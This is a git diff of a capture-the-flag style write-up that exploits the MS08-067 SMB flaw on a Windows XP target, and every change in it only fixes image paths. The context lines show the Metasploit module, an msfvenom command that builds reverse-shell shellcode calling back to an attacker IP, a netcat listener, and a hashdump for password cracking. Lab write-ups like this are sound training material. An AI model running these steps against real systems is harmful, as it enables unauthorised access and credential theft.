@@ -100,9 +100,9 @@ The above command shows this machine is vulnerable to 2 SMB vulnerabilities.
 
 Using the Metasploit module `exploit/windows/smb/ms08_067_netapi`, we'll set up our payload as such:
 
-![](<../../../../.gitbook/assets/image (49) (2) (1).png>)
+![](<../../../.gitbook/assets/image (49) (2) (1).png>)
 
-![](<../../../../.gitbook/assets/image (69).png>)
+![](<../../../.gitbook/assets/image (69).png>)
 
 {% hint style="info" %}
 To set options (e.g. RHOSTS), enter "set RHOST \[target IP]"
@@ -110,7 +110,7 @@ To set options (e.g. RHOSTS), enter "set RHOST \[target IP]"
 
 With this information entered, we can now run the exploit with `run` or `exploit`
 
-![](<../../../../.gitbook/assets/image (43) (1) (1).png>)
+![](<../../../.gitbook/assets/image (43) (1) (1).png>)
 
 As shown in the image above, running getuid returns us NT AUTHORITY\SYSTEM which means no privilege escalation is needed as we have the highest privileges on the current system.
 
@@ -128,13 +128,13 @@ First I run the msfvenom command mentioned in the code.
 msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.13 LPORT=443 EXITFUNC=thread -b "\x00\x0a\x0d\x5c\x5f\x2f\x2e\x40" -f py -v shellcode -a x86 --platform windows
 ```
 
-![](<../../../../.gitbook/assets/image (57).png>)
+![](<../../../.gitbook/assets/image (57).png>)
 
 Then replace the shellcode in the code with the shellcode we just generated.
 
 Running an nmap scan on the target once more with -O (OS Detection) reveals that the target is running Microsoft Windows XP SP3 (94%). With this is mind, we'll trying using this sample command
 
-![](<../../../../.gitbook/assets/image (67) (1).png>)
+![](<../../../.gitbook/assets/image (67) (1).png>)
 
 Let's set up a netcat listener and then run the command and you should get a reverse shell.
 
@@ -148,6 +148,6 @@ I've followed these articles, but had no success.
 
 One thing we can do with the meterpreter shell is run a hashdump on the target
 
-![](<../../../../.gitbook/assets/image (48).png>)
+![](<../../../.gitbook/assets/image (48).png>)
 
 We can then take these hashes and crack them with JohnTheRipper or Hashcat
